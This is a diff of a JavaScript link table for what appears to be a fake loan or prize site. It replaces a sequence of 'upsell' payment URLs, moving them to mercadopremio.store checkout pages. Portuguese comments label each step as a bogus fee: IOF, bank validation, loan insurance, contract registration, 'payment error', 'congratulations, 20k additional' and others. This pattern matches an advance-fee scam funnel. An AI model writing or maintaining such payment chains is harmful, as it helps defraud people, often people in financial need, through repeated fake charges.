@@ -1,16 +1,17 @@
    const baseLinks = {
   up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
-  up2: "https://pay.agil-app.online/rn4RgQvoeDW3wBV", // Validação Bancaria
-  up3: "https://pay.agilbank.site/5pjw3RnOLQ032lQ", // Seguro Prestamista "tarifa de cadastro"
-  up4: "https://pay.app-agil.shop/YL9jZDWVLKl3p4q", // NFe
-  up5: "https://pay.app-agil.fun/QqyLgqolO7JZvkE", // Ativar conta
-  up6: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // Taxa de registro do contrato
-  up7: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // ParabÃ©ns, 20k adicional
-  up8: "https://google.com", // Erro no pagamento - 14,06
-  up9: "https://google.com", // APP - 11,99
-  up10: "https://google.com", // Taxa de Abertura TAC - 16,92
-  up11: "https://google.com", // Taxa de Consultoria Financeira - 19,53
+  up2: "https://pay.mercadopremio.store/65XDZB8L4JpgVJw", // Validação Bancaria
+  up3: "https://pay.mercadopremio.store/n1NLgwJ7BMpGMxE", // Seguro Prestamista "tarifa de cadastro"
+  up4: "https://pay.mercadopremio.store/N1nVZpYmNbLGlM6", // NFe
+  up5: "https://pay.mercadopremio.store/kYL6geWm54oZrKM", // Ativar conta
+  up6: "https://pay.mercadopremio.store/DPXw3XemwEOZzmp", // Taxa de registro do contrato
+  up7: "https://pay.mercadopremio.store/eApQgz2jBMJgEb7", // ParabÃ©ns, 20k adicional
+  up8: "https://pay.mercadopremio.store/DYp0ZxVEBMQgmvX", // Erro no pagamento - 14,06
+  up9: "https://pay.mercadopremio.store/P5LNZ8zMRAOgaRy", // APP - 11,99
+  up10: "https://pay.mercadopremio.store/nWrxGWALw7O3654", // Taxa de Abertura TAC - 16,92
+  up11: "https://pay.mercadopremio.store/lDW0ZaJmeaRGN7E", // Taxa de Consultoria Financeira - 19,53
   up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
+
 };
 
 function redirect(key) {
